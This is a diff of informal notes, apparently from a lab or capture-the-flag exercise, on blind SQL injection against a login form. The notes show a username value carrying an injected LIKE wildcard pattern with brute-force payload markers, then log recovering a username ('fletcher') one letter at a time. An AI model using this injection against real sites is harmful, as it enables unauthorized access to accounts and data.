@@ -26,3 +26,12 @@ username=' or LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
 and option payload set: 1
 optin payload type brute-force
 13. later remplace letter with greater that length
+14. I find the first letter named fletche how one letter
+have: f position 1 and request 7 length 598
+	: l position 2 and request 50 length 598
+	: e position 3 and request 80 length 598
+	: t position 4 and request 132 length 598
+	: c position 5 and request 152 length 598
+	: h position 6 and request 194 length 598
+	: e position 7 and request 228 length 598
+	: r position 8 and request 278 length 598
